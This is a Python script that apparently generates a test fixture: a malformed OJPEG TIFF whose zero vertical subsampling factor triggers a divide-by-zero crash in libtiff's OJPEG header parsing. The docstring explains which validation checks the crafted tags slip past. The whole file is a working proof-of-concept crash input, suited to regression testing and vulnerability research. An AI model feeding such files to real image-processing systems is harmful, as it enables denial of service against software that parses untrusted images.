#!/usr/bin/env python3
"""Generate the residual R1 fixture: an OJPEG TIFF whose YCbCrSubsampling
vertical factor is 0, driving OJPEGReadHeaderInfo() into
    sp->strile_length % (sp->subsampling_ver*8)      (tif_ojpeg.c:1079)
i.e. an integer divide-by-zero the 2016 decoder_ok fix never reaches.

Layout (little-endian classic TIFF):
  Compression   = 6  (OJPEG)
  Photometric   = 10 (ITULAB)  -- keeps subsampling_ver=0 alive past
                                  OJPEGSubsamplingCorrect and bypasses the
                                  tif_strip.c YCbCr subsampling validation
  SamplesPerPixel = 3, PlanarConfig = 1, BitsPerSample = 8,8,8
  ImageWidth = 16, ImageLength = 32, RowsPerStrip = 8  (strile_length < image_length
                                  so the line-1079 divide branch is entered)
  YCbCrSubsampling = (2,0)      -- vertical factor 0 == the divisor
  Strip payload = 0xAA*64       -- no valid SOI/SOF, so OJPEGReadHeaderInfoSec
                                  bails before component parse; the zero survives.
"""
import struct, sys, os

def short_entry(tag, value):
    # SHORT, count 1, value inline
    return struct.pack("<HHI", tag, 3, 1) + struct.pack("<HH", value, 0)

def short2_entry(tag, v0, v1):
    # SHORT, count 2, both inline
    return struct.pack("<HHI", tag, 3, 2) + struct.pack("<HH", v0, v1)

def offset_entry(tag, typ, count, offset):
    return struct.pack("<HHII", tag, typ, count, offset)

def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "poc_r1_ojpeg_readheader_subsampling.tif"

    ifd_offset = 8
    n_entries = 11
    ifd_size = 2 + n_entries * 12 + 4
    ext = ifd_offset + ifd_size            # start of external data

    bps_off   = ext                        # 3 shorts = 6 bytes
    stripoff_off = bps_off + 6             # 4 longs  = 16 bytes
    stripbc_off  = stripoff_off + 16       # 4 longs  = 16 bytes
    payload_off  = stripbc_off + 16        # 64 bytes of 0xAA (4 strips x 16)

    strip_offsets = [payload_off + i * 16 for i in range(4)]
    strip_counts  = [16, 16, 16, 16]

    entries = b"".join([
        short_entry(256, 16),                          # ImageWidth
        short_entry(257, 32),                          # ImageLength
        offset_entry(258, 3, 3, bps_off),              # BitsPerSample 8,8,8
        short_entry(259, 6),                           # Compression OJPEG
        short_entry(262, 10),                          # Photometric ITULAB
        offset_entry(273, 4, 4, stripoff_off),         # StripOffsets
        short_entry(277, 3),                           # SamplesPerPixel
        short_entry(278, 8),                           # RowsPerStrip
        offset_entry(279, 4, 4, stripbc_off),          # StripByteCounts
        short_entry(284, 1),                           # PlanarConfig contig
        short2_entry(530, 2, 0),                       # YCbCrSubsampling (2,0)
    ])
    assert len(entries) == n_entries * 12

    ifd = struct.pack("<H", n_entries) + entries + struct.pack("<I", 0)
    assert len(ifd) == ifd_size

    body = struct.pack("<HHI", 0x4949, 42, ifd_offset)   # header
    body += ifd
    body += struct.pack("<HHH", 8, 8, 8)                  # BitsPerSample
    body += b"".join(struct.pack("<I", o) for o in strip_offsets)
    body += b"".join(struct.pack("<I", c) for c in strip_counts)
    body += b"\xAA" * 64

    with open(out, "wb") as f:
        f.write(body)
    print("wrote %s (%d bytes)" % (out, len(body)))

if __name__ == "__main__":
    main()
